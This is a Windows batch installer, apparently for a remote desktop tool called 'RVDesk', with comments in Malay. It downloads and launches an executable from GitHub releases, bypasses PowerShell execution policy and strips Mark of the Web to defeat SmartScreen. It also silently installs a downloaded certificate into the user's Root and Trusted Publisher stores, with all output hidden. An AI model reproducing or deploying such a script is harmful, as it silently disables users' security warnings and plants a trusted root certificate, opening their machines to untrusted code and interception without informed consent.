@echo off
:: ============================================================================
:: RVDesk Official Smart Downloader & Installer (Anti-SmartScreen)
:: Automated deployment with progress indicator by RithV Services.
:: Official Support: rithvservices@gmail.com
:: Repository: https://github.com/dnlhrth01/rvsdesk
:: ============================================================================
setlocal EnableExtensions EnableDelayedExpansion
title RVDesk Official Installer - RithV Services
cd /d "%~dp0"

set "TARGET_EXE=RVDesk.exe"
set "CER_FILE=RVDesk_Authority.cer"
set "REPO=dnlhrth01/rvsdesk"
set "SUPPORT_EMAIL=rithvservices@gmail.com"
set "DOWNLOAD_URL=https://github.com/%REPO%/releases/latest/download/RVDesk-Portable.exe"
set "CER_URL=https://github.com/%REPO%/releases/latest/download/%CER_FILE%"

cls
echo ==========================================================
echo   RVDesk Remote Desktop - Official Installer
echo   Powered by RithV Services
echo   Support: %SUPPORT_EMAIL%
echo ==========================================================
echo.

:: 1. Jika RVDesk.exe sudah wujud, nyahsekat dan lancarkan serta-merta tanpa soal
if exist "%TARGET_EXE%" (
    echo [+] Memulakan %TARGET_EXE% sedia ada...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '.\%TARGET_EXE%' -ErrorAction SilentlyContinue"
    goto :launchApp
)

:: 2. Muat turun binary RVDesk dengan paparan progress bar sahaja
echo [*] Memuat turun RVDesk Official Binary...
echo.

where curl.exe >nul 2>&1
if %ERRORLEVEL% equ 0 (
    curl.exe -fSL --progress-bar "%DOWNLOAD_URL%" -o "%TARGET_EXE%"
) else (
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
        "$ProgressPreference='Continue';" ^
        "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;" ^
        "$wc = New-Object System.Net.WebClient;" ^
        "$wc.DownloadFile('%DOWNLOAD_URL%', '%TARGET_EXE%')"
)

if not exist "%TARGET_EXE%" (
    echo.
    echo [!] Ralat: Gagal memuat turun fail. Sila pastikan sambungan internet aktif.
    echo [i] Jika isu berterusan, sila hubungi: %SUPPORT_EMAIL%
    timeout /t 5 >nul
    exit /b 1
)

:: 3. Pasang sijil dan buang Mark of the Web secara senyap di latar belakang
where curl.exe >nul 2>&1
if %ERRORLEVEL% equ 0 (
    curl.exe -fsSL "%CER_URL%" -o "%CER_FILE%" >nul 2>&1
) else (
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
        "$ProgressPreference='SilentlyContinue';" ^
        "try { (New-Object System.Net.WebClient).DownloadFile('%CER_URL%', '%CER_FILE%') } catch {}" >nul 2>&1
)

if exist "%CER_FILE%" (
    certutil -addstore -user "TrustedPublisher" "%CER_FILE%" >nul 2>&1
    certutil -addstore -user "Root" "%CER_FILE%" >nul 2>&1
)

:: 4. Nyahsekat Zone.Identifier (Anti-SmartScreen) & Cipta Pintasan Desktop secara senyap
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "if (Test-Path '.\%TARGET_EXE%') { Unblock-File -Path '.\%TARGET_EXE%' -ErrorAction SilentlyContinue };" ^
    "if (Test-Path '.\%CER_FILE%') { Unblock-File -Path '.\%CER_FILE%' -ErrorAction SilentlyContinue };" ^
    "$w = New-Object -ComObject WScript.Shell;" ^
    "$s = $w.CreateShortcut([IO.Path]::Combine([Environment]::GetFolderPath('Desktop'), 'RVDesk.lnk'));" ^
    "$s.TargetPath = (Resolve-Path '.\%TARGET_EXE%').Path;" ^
    "$s.WorkingDirectory = (Resolve-Path '.').Path;" ^
    "$s.Description = 'RVDesk Remote Desktop';" ^
    "$s.Save()" >nul 2>&1

:: 5. Siap dan maklumkan kepada pengguna, kemudian buka aplikasi secara automatik
echo.
echo ==========================================================
echo   [OK] Pemasangan selesai! Pintasan Desktop dicipta.
echo   Bantuan / Support: %SUPPORT_EMAIL%
echo   Melancarkan RVDesk sekarang...
echo ==========================================================

:launchApp
start "" "%TARGET_EXE%" %*
exit /b 0
